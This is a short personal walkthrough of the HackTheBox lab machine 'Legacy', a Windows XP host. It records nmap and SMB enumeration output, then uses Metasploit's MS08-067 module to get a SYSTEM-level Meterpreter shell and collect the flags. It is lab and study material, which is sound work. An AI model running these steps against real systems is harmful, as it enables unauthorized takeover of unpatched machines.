# Legacy 10.10.10.4 - Windows

## 00 - Initial Attempt, 05/04/20

__(Successful user & root day-of, number: 001 for both.)__

`nmap -sC -sV -oA legacy -Pn 10.10.10.4`

```shell
thoth@kali:~/Projects/htb-notes/machines/Legacy/dumps$ nmap -sC -sV -Pn 10.10.10.4
Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-04 20:05 EDT
Nmap scan report for 10.10.10.4
Host is up (0.029s latency).
Not shown: 997 filtered ports
PORT     STATE  SERVICE       VERSION
139/tcp  open   netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open   microsoft-ds  Windows XP microsoft-ds
3389/tcp closed ms-wbt-server
Service Info: OSs: Windows, Windows XP; CPE: cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_xp

Host script results:
|_clock-skew: mean: -4h26m27s, deviation: 2h07m17s, median: -5h56m28s
|_nbstat: NetBIOS name: LEGACY, NetBIOS user: <unknown>, NetBIOS MAC: 00:50:56:b9:ff:cb (VMware)
| smb-os-discovery:
|   OS: Windows XP (Windows 2000 LAN Manager)
|   OS CPE: cpe:/o:microsoft:windows_xp::-
|   Computer name: legacy
|   NetBIOS computer name: LEGACY\x00
|   Workgroup: HTB\x00
|_  System time: 2020-05-05T00:08:46+03:00
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_smb2-time: Protocol negotiation failed (SMB2)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 63.38 seconds
```

#### Initial Ideas and Reactions

 - Windows XP machine
 - port 139 is smb server
  - message signing disabled, guest account, auth level user
 - 445 Windows File Sharing and other MS services
 - 3389 CLOSED ms-wbt-server


Attempted to use `smbclient -L` along with `-U`, `-p`, `-I` etc to try to connect to 139 and 445. No dice. Ran `msfconsole` and `/scanner/smb/smb_version`:

```shell
msf5 auxiliary(scanner/smb/smb_version) > run

[+] 10.10.10.4:445        - Host is running Windows XP SP3 (language:English) (name:LEGACY) (workgroup:HTB ) (signatures:optional)
```

Following along with CyberMentor I `msf5 > search windows/smb` and `use windows/smb/ms08_067_netap`

```powershell
meterpreter > sysinfo
Computer        : LEGACY
OS              : Windows XP (5.1 Build 2600, Service Pack 3).
Architecture    : x86
System Language : en_US
Domain          : HTB
Logged On Users : 1
Meterpreter     : x86/windows

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

From here I was able to navigate to `C:\Documents and Settings\john\Desktop` to find the user flag. And into `Administrator` for the root flag.